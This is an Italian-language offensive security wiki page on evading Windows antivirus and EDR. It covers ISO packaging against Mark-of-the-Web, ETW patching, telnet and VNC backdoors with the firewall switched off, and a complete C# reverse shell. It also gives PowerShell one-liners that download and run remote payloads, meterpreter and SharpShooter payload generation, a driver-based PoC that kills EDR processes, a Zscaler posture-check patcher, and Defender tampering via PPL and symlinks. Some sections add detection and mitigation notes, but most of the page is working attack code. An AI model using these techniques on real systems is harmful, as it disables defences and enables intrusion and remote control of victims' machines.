Potresti aver visto questa schermata durante il download e l'esecuzione di alcuni eseguibili da Internet.

Microsoft Defender SmartScreen è un meccanismo di sicurezza progettato per proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente dannose.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funziona principalmente tramite un approccio basato sulla reputazione: ciò significa che le applicazioni scaricate raramente attiveranno SmartScreen, che avviserà l'utente finale e impedirà l'esecuzione del file (anche se il file può comunque essere eseguito facendo clic su More Info -> Run anyway).

**MoTW** (Mark of The Web) è un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con il nome Zone.Identifier, creato automaticamente quando si scaricano file da Internet, insieme all'URL da cui sono stati scaricati.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verifica dell'ADS Zone.Identifier per un file scaricato da Internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma **trusted** **non attiveranno SmartScreen**.

Un modo molto efficace per impedire che i payload ricevano il Mark of The Web consiste nel pacchettarli all'interno di una sorta di container, come un ISO. Questo accade perché il Mark-of-the-Web (MOTW) **non può** essere applicato a volumi **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che pacchettizza i payload in container di output per eludere il Mark-of-the-Web.

Esempio di utilizzo:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ecco una demo per bypassare SmartScreen impacchettando i payload all'interno di file ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging in Windows che consente alle applicazioni e ai componenti di sistema di **registrare eventi**. Tuttavia, può anche essere utilizzato dai prodotti di sicurezza per monitorare e rilevare attività dannose.

In modo simile a come viene disabilitato (bypassato) AMSI, è anche possibile fare in modo che la funzione **`EtwEventWrite`** del processo user space restituisca immediatamente il controllo senza registrare alcun evento. Questo si ottiene applicando una patch alla funzione in memoria affinché restituisca immediatamente il controllo, disabilitando di fatto il logging ETW per quel processo.

Puoi trovare maggiori informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) e [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Il caricamento di binari C# in memoria è noto da tempo ed è ancora un ottimo metodo per eseguire i tuoi strumenti di post-exploitation senza essere rilevati dall'AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo preoccuparci soltanto di applicare una patch ad AMSI per l'intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) offre già la possibilità di eseguire assembly C# direttamente in memoria, ma esistono diversi modi per farlo:

- **Fork\&Run**

Consiste nello **spawnare un nuovo processo sacrificale**, iniettare il tuo codice dannoso di post-exploitation nel nuovo processo, eseguire il codice dannoso e, al termine, terminare il nuovo processo. Questo approccio presenta vantaggi e svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **al di fuori** del processo del nostro Beacon implant. Ciò significa che, se qualcosa va storto o viene rilevato durante la nostra attività di post-exploitation, c'è una **probabilità molto maggiore** che il nostro **implant sopravviva.** Lo svantaggio è che c'è una **probabilità maggiore** di essere rilevati dalle **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Consiste nell'iniettare il codice dannoso di post-exploitation **nel proprio processo**. In questo modo puoi evitare di dover creare un nuovo processo e di farlo scansionare dall'AV, ma lo svantaggio è che, se qualcosa va storto durante l'esecuzione del payload, c'è una **probabilità molto maggiore** di **perdere il beacon**, poiché potrebbe andare in crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi leggere maggiori informazioni sul caricamento di C# Assembly, consulta questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e il loro InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare C# Assemblies **da PowerShell**; consulta [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e il [video di S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice dannoso usando altri linguaggi, fornendo alla macchina compromessa l'accesso **all'ambiente dell'interprete installato sulla condivisione SMB controllata dall'Attacker**.

Consentendo l'accesso ai binari dell'interprete e all'ambiente sulla condivisione SMB, puoi **eseguire codice arbitrario in questi linguaggi all'interno della memoria** della macchina compromessa.

Il repository indica che Defender continua a scansionare gli script, ma utilizzando Go, Java, PHP ecc. abbiamo **maggiore flessibilità nel bypassare le static signatures**. I test con reverse shell scripts casuali e non offuscati in questi linguaggi hanno avuto esito positivo.

## TokenStomping

Token stomping è una tecnica che consente a un attacker di **manipolare l'access token o un prodotto di sicurezza come un EDR o un AV**, permettendogli di ridurne i privilegi affinché il processo non termini, pur non avendo i permessi per verificare la presenza di attività dannose.

Per impedirlo, Windows potrebbe **impedire ai processi esterni** di ottenere handle sui token dei processi di sicurezza.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Come descritto in [**questo blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è facile distribuire Chrome Remote Desktop sul PC di una vittima, prenderne il controllo e mantenere la persistence:
1. Scarica il programma da https://remotedesktop.google.com/, fai clic su "Set up via SSH", quindi fai clic sul file MSI per Windows per scaricare il file MSI.
2. Esegui l'installer in modalità silenziosa sulla vittima (sono richiesti i privilegi di amministratore): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e fai clic su next. La procedura guidata ti chiederà quindi di autorizzare; fai clic sul pulsante Authorize per continuare.
4. Esegui il parametro fornito con alcune modifiche: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota il parametro pin, che consente di impostare il PIN senza usare la GUI).


## Advanced Evasion

L'evasion è un argomento molto complesso; a volte devi tenere conto di molte fonti diverse di telemetria all'interno di un singolo sistema, quindi è praticamente impossibile rimanere completamente non rilevati negli ambienti maturi.

Ogni ambiente che attacchi avrà i propri punti di forza e le proprie debolezze.

Ti consiglio vivamente di guardare questo talk di [@ATTL4S](https://twitter.com/DaniLJ94), per acquisire una base sulle tecniche di Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Questo è anche un altro ottimo talk di [@mariuszbit](https://twitter.com/mariuszbit) sull'Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Puoi usare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), che **rimuoverà parti del binario** finché non **individuerà quale parte Defender** rileva come dannosa, indicandotela.\
Un altro strumento che fa **la stessa cosa è** [**avred**](https://github.com/dobin/avred), con un servizio web disponibile su [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Fino a Windows10, tutti i sistemi Windows includevano un **Telnet server** che potevi installare (come amministratore) eseguendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fallo **avviare** all'avvio del sistema ed **eseguilo** ora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Modificare la porta telnet** (furtività) e disabilitare il firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Scaricalo da: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (sono necessari i download binari, non il setup)

**SULL'HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l'opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Quindi, sposta il binario _**winvnc.exe**_ e il file **UltraVNC.ini** appena creato all'interno del **victim**

#### **Reverse connection**

L'**attacker** deve **eseguire all'interno** del proprio **host** il binario `vncviewer.exe -listen 5900`, in modo da essere **preparato** a ricevere una **VNC connection** inversa. Quindi, all'interno del **victim**: avvia il daemon winvnc `winvnc.exe -run` ed esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENZIONE:** Per mantenere la stealth non devi fare alcune cose

- Non avviare `winvnc` se è già in esecuzione, altrimenti attiverai un [popup](https://i.imgur.com/1SROTTl.png). Verifica se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory, altrimenti si aprirà [la finestra di configurazione](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per ottenere aiuto, altrimenti attiverai un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
All'interno di GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ora **avvia il listener** con `msfconsole -r file.rc` ed **esegui** il **payload xml** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**L'attuale defender terminerà il processo molto rapidamente.**

### Compilazione della nostra reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prima reverse shell in C#

Compilala con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Usalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando il compilatore
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download and esecuzione automatici:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco di obfuscator C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Usare Python per creare injector, esempio:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Altro

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Terminare AV/EDR dal Kernel Space

Storm-2603 ha sfruttato una piccola utility console nota come **Antivirus Terminator** per disabilitare le protezioni degli endpoint prima di distribuire il ransomware. Lo strumento porta con sé il **proprio driver vulnerabile ma *firmato*** e ne abusa per eseguire operazioni privilegiate nel kernel che persino i servizi AV Protected-Process-Light (PPL) non possono bloccare.

Punti chiave
1. **Driver firmato**: il file scritto su disco è `ServiceMouse.sys`, ma il binario è il driver legittimamente firmato `AToolsKrnl64.sys` del “System In-Depth Analysis Toolkit” di Antiy Labs. Poiché il driver ha una firma Microsoft valida, viene caricato anche quando Driver-Signature-Enforcement (DSE) è abilitato.
2. **Installazione del service**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La prima riga registra il driver come **kernel service** e la seconda lo avvia, rendendo `\\.\ServiceMouse` accessibile dalla user land.
3. **IOCTL esposti dal driver**
| Codice IOCTL | Funzionalità                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminare un processo arbitrario tramite PID (utilizzato per terminare i servizi Defender/EDR) |
| `0x990000D0` | Eliminare un file arbitrario dal disco |
| `0x990001D0` | Scaricare il driver e rimuovere il service |

Proof-of-concept C minimale:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Perché funziona**: BYOVD aggira completamente le protezioni user-mode; il codice eseguito nel kernel può aprire processi *protetti*, terminarli o manomettere gli oggetti del kernel indipendentemente da PPL/PP, ELAM o altre funzionalità di hardening.

Rilevamento / Mitigazione
•  Abilitare la vulnerable-driver block list di Microsoft (`HVCI`, `Smart App Control`) affinché Windows rifiuti di caricare `AToolsKrnl64.sys`.
•  Monitorare la creazione di nuovi *kernel* service e generare un alert quando un driver viene caricato da una directory scrivibile da tutti o non presente nell’allow-list.
•  Monitorare gli handle user-mode verso oggetti device personalizzati, seguiti da chiamate `DeviceIoControl` sospette.

### Aggirare i Posture Check di Zscaler Client Connector tramite patching del binario su disco

**Client Connector** di Zscaler applica localmente le regole di device posture e si affida a Windows RPC per comunicare i risultati agli altri componenti. Due scelte progettuali deboli rendono possibile un bypass completo:

1. La valutazione della posture avviene **interamente lato client** (al server viene inviato un booleano).
2. Gli endpoint RPC interni verificano soltanto che l’eseguibile connesso sia **firmato da Zscaler** (tramite `WinVerifyTrust`).

Tramite il **patching su disco di quattro binari firmati**, entrambi i meccanismi possono essere neutralizzati:

| Binario | Logica originale sottoposta a patch | Risultato |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Restituisce sempre `1`, quindi ogni check risulta conforme |
| `ZSAService.exe` | Chiamata indiretta a `WinVerifyTrust` | NOP-ed ⇒ qualsiasi processo, anche non firmato, può collegarsi alle pipe RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituita da `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Controlli di integrità sul tunnel | Bypassati |

Estratto minimale del patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Dopo aver sostituito i file originali e riavviato lo stack dei servizi:

* **Tutti** i controlli di postura risultano **verdi/conformi**.
* I binari non firmati o modificati possono aprire gli endpoint RPC delle named pipe (ad esempio `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'host compromesso ottiene accesso illimitato alla rete interna definita dalle policy di Zscaler.

Questo caso di studio dimostra come le decisioni di trust esclusivamente lato client e i semplici controlli delle firme possano essere aggirati con pochi patch di byte.

## Abusare di Protected Process Light (PPL) per manomettere AV/EDR con LOLBINs

Protected Process Light (PPL) applica una gerarchia di signer/livello, in modo che solo i processi protetti con un livello uguale o superiore possano manomettersi a vicenda. Dal punto di vista offensivo, se puoi avviare legittimamente un binario abilitato per PPL e controllarne gli argomenti, puoi trasformare una funzionalità benigna (ad esempio il logging) in una primitiva di scrittura vincolata e supportata da PPL contro le directory protette utilizzate da AV/EDR.

Cosa fa eseguire un processo come PPL
- L'EXE target (e qualsiasi DLL caricata) deve essere firmato con un EKU compatibile con PPL.
- Il processo deve essere creato con CreateProcess utilizzando i flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Deve essere richiesto un livello di protezione compatibile con il signer del binario (ad esempio `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` per i signer anti-malware, `PROTECTION_LEVEL_WINDOWS` per i signer Windows). Livelli errati impediranno la creazione.

Vedi anche un'introduzione più generale a PP/PPL e alla protezione di LSASS qui:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Strumenti di avvio
- Helper open-source: CreateProcessAsPPL (seleziona il livello di protezione e inoltra gli argomenti all'EXE target):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Schema di utilizzo:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Il binario di sistema firmato `C:\Windows\System32\ClipUp.exe` si avvia autonomamente e accetta un parametro per scrivere un file di log in un percorso specificato dal chiamante.
- Quando viene avviato come processo PPL, la scrittura del file avviene con il supporto di PPL.
- ClipUp non può analizzare percorsi contenenti spazi; usa i percorsi brevi 8.3 per puntare a posizioni normalmente protette.

Helper per i percorsi brevi 8.3
- Elenca i nomi brevi: `dir /x` in ciascuna directory padre.
- Ricava il percorso breve in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Catena di abuso (astratta)
1) Avvia il LOLBIN compatibile con PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un launcher (ad esempio CreateProcessAsPPL).
2) Passa l'argomento del percorso del log di ClipUp per forzare la creazione di un file in una directory AV protetta (ad esempio Defender Platform). Se necessario, usa i nomi brevi 8.3.
3) Se il binario di destinazione è normalmente aperto/bloccato dall'AV durante l'esecuzione (ad esempio MsMpEng.exe), pianifica la scrittura all'avvio, prima che l'AV venga avviato, installando un servizio auto-start che venga eseguito in modo affidabile in precedenza. Convalida l'ordine di avvio con Process Monitor (boot logging).
4) Al riavvio, la scrittura supportata da PPL avviene prima che l'AV blocchi i suoi binari, corrompendo il file di destinazione e impedendone l'avvio.

Esempio di invocazione (percorsi oscurati/abbreviati per sicurezza):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Note e vincoli
- Non puoi controllare i contenuti che ClipUp scrive, oltre alla posizione; la primitive è adatta alla corruzione piuttosto che all'iniezione precisa di contenuti.
- Richiede privilegi di amministratore locale/SYSTEM per installare/avviare un servizio e una finestra temporale per il riavvio.
- Il timing è fondamentale: il target non deve essere aperto; l'esecuzione al boot evita i file lock.

Rilevamenti
- Creazione del processo `ClipUp.exe` con argomenti insoliti, soprattutto quando il processo padre è un launcher non standard, in prossimità del boot.
- Nuovi servizi configurati per l'avvio automatico di binari sospetti e che si avviano sistematicamente prima di Defender/AV. Analizza la creazione/modifica dei servizi prima dei malfunzionamenti dell'avvio di Defender.
- Monitoraggio dell'integrità dei file sui binari e sulle directory della Platform di Defender; creazioni/modifiche di file impreviste da parte di processi con protected-process flags.
- Telemetria ETW/EDR: cerca processi creati con `CREATE_PROTECTED_PROCESS` e un uso anomalo dei livelli PPL da parte di binari non-AV.

Mitigazioni
- WDAC/Code Integrity: limita quali binari firmati possono essere eseguiti come PPL e da quali processi padre; blocca l'invocazione di ClipUp al di fuori dei contesti legittimi.
- Service hygiene: limita la creazione/modifica dei servizi ad avvio automatico e monitora la manipolazione dell'ordine di avvio.
- Assicurati che la tamper protection di Defender e le protezioni early-launch siano abilitate; analizza gli errori di avvio che indicano la corruzione dei binari.
- Valuta la disabilitazione della generazione dei nomi brevi 8.3 sui volumi che ospitano strumenti di sicurezza, se compatibile con il tuo ambiente (esegui test approfonditi).

Riferimenti per PPL e tooling
- Panoramica Microsoft sui Protected Processes: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- Riferimento EKU: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Logging del boot di Procmon (verifica dell'ordine): https://learn.microsoft.com/sysinternals/downloads/procmon
- Launcher CreateProcessAsPPL: https://github.com/2x7EQ13/CreateProcessAsPPL
- Writeup della tecnica (ClipUp + PPL + tampering dell'ordine di boot): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Manomissione di Microsoft Defender tramite Hijack del Symlink della Cartella della Versione della Platform

Windows Defender sceglie la Platform da cui viene eseguito enumerando le sottocartelle in:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Seleziona la sottocartella con la stringa di versione lessicograficamente più alta (ad esempio, `4.18.25070.5-0`), quindi avvia da lì i processi del servizio Defender (aggiornando di conseguenza i path del servizio e del registro). Questa selezione considera attendibili le directory entry, inclusi i directory reparse point (symlink). Un amministratore può sfruttare questo comportamento per reindirizzare Defender verso un path scrivibile dall'attacker e ottenere DLL sideloading o la disattivazione del servizio.

Prerequisiti
- Amministratore locale (necessario per creare directory/symlink nella cartella Platform)
- Possibilità di riavviare il sistema o attivare una nuova selezione della Platform di Defender (riavvio del servizio al boot)
- Sono necessari solo strumenti integrati (mklink)

Perché funziona
- Defender blocca le scritture nelle proprie cartelle, ma la selezione della Platform considera attendibili le directory entry e sceglie la versione lessicograficamente più alta senza verificare che il target risolva a un path protetto/attendibile.

Passo per passo (esempio)
1) Prepara un clone scrivibile della cartella Platform corrente, ad esempio `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un symlink di directory con una versione superiore all'interno di Platform che punti alla tua cartella:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selezione del trigger (riavvio consigliato):
```cmd
shutdown /r /t 0
```
4) Verifica che MsMpEng.exe (WinDefend) venga eseguito dal percorso reindirizzato:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
È necessario osservare il nuovo percorso del processo in `C:\TMP\AV\` e la configurazione del servizio/registro che riflette tale posizione.

Post-exploitation options
- DLL sideloading/code execution: rilasciare/sostituire DLL che Defender carica dalla propria directory applicativa per eseguire codice nei processi di Defender. Vedere la sezione precedente: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: rimuovere il version-symlink affinché, al successivo avvio, il percorso configurato non venga risolto e Defender non riesca ad avviarsi:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Nota che questa tecnica non fornisce privilege escalation da sola; richiede diritti di amministratore.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

I Red team possono spostare l'evasione a runtime dall'impianto C2 direttamente nel modulo target eseguendo l'hooking della relativa Import Address Table (IAT) e instradando API selezionate attraverso codice position-independent (PIC) controllato dall'attaccante. Questo generalizza l'evasione oltre la piccola superficie API esposta da molti kit (ad esempio, CreateProcessA) ed estende le stesse protezioni a BOF e DLL di post-exploitation.

Approccio di alto livello
- Stagiare un blob PIC accanto al modulo target usando un reflective loader (anteposto o companion). Il PIC deve essere self-contained e position-independent.
